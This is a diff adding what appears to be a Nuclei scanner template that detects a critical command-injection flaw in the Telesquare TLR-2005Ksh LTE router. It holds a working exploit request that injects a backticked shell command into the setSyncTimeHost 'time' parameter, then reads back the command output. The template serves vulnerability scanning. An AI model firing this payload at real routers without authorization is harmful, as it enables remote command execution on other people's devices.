@@ -1,0 +1,35 @@
+id: telesquare-tlr-2005ksh-rce
+info:
+  name: Telesquare TLR-2005Ksh setSyncTimeHost RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Telesquare TLR-2005Ksh is a Sk Telecom LTE router produced by Telesquare Korea. There is a security vulnerability in Telesquare TLR-2005Ksh that allows attackers to execute arbitrary commands through setSyncTimeHost to obtain server privileges.
+  reference:
+    - https://github.com/splashsc/IOT_Vulnerability_Discovery/blob/main/Telesquare/1_cmdi.md
+  classification:
+    cvss-metrics: '3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    cvss-score: 9.8
+  tags: command-execution
+http:
+  - raw:
+      - |
+        GET /cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`id>output.txt` HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<result>success</result>"
+  - raw:
+      - |
+        GET /cgi-bin/output.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
